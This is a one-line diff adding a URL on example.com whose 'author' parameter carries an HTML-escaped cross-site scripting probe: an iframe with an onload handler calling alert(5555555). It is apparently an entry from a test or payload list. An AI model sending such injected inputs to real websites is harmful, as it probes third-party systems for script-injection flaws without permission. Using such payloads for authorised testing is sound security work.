@@ -1,0 +1,3 @@
+http://www.example.com/publications/index.php?author=1&lt;iframe/+/onload=alert(5555555)&gt;
+
+
